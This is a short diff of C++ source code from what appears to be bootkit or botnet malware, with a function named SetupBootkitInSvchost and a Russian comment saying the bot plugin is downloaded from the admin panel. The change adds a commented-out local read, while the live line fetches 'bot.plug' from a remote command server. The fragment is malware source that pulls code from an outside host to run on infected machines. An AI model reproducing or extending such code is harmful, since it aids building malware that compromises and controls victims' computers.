@@ -377,6 +377,8 @@ DWORD WINAPI SetupBootkitInSvchost(LPVOID)
 //скачиваем bot.plug с админки
 static BYTE* GetBotPlug( DWORD& size )
 {
+//	return File::ReadToBufferA("bot.plug", size);
+
 	BYTE* botPlug = Plugin::DownloadEx( "bot.plug", NULL, &size, true, false, NULL );
 	return botPlug;
 }
